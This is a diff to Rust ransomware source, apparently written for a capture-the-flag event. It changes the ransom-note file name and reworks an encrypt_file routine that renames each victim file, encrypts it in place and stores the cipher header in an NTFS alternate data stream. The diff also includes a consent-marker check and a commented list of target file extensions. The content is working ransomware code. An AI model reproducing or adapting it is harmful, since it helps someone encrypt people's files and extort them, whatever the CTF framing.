@@ -26,7 +26,7 @@ const EXPECTED_COMPUTER_NAME_HASH_HEX: &'static str =
     "7e199a3cd61f888b67bbc6eb5ea707bca51b6d5af06b39c2fb038426f1a17fe5";
 const CONSENT_MARKER_FILE_NAME: &'static str =
     "YesIKnowIAmRunningARealRansomwareTheDecryptionKeyWillOnlyBeReleasedAfterTheCTFEndsPleaseGoOn.txt";
-const RANSOM_LETTER_FILE_NAME: &'static str = "!!!READMEToRecoverYourFiles!!!.txt";
+const RANSOM_LETTER_FILE_NAME: &'static str = "README_ALL_YOUR_FILES_ARE_BELONG_TO_US.txt";
 // const EXTENSION_TO_ENCRYPT: &'static [&'static str] = &[
 //     "txt", "doc", "docx", "jpg", "png", "bmp", "7z", "zip", "rar", "sav", "py", "js", "ppt",
 //     "pptx", "xls", "xlsx",
@@ -140,15 +140,12 @@ fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
     new_name.push(":HRW");
     let ads_path = path.as_ref().with_file_name(new_name);
 
-    // TODO: This overwrites the file in-place, but it's not atomic, nor error-safe. At least make
-    // it error-safe.
     fs::rename(&path, &new_path)?;
     let mut fin = File::open(&new_path)?;
     let mut fout = File::options().read(true).write(true).open(&new_path)?;
+    let mut fads = File::create(&ads_path)?;
     let header = cipher::encrypt_stream(&key, &mut fin, &mut fout)?;
-    File::create(ads_path)?.write_all(&header.to_vec())?;
-    fout.flush().ok();
-    fout.sync_data().ok();
+    fads.write_all(&header.to_vec())?;
     Ok(())
 }
 
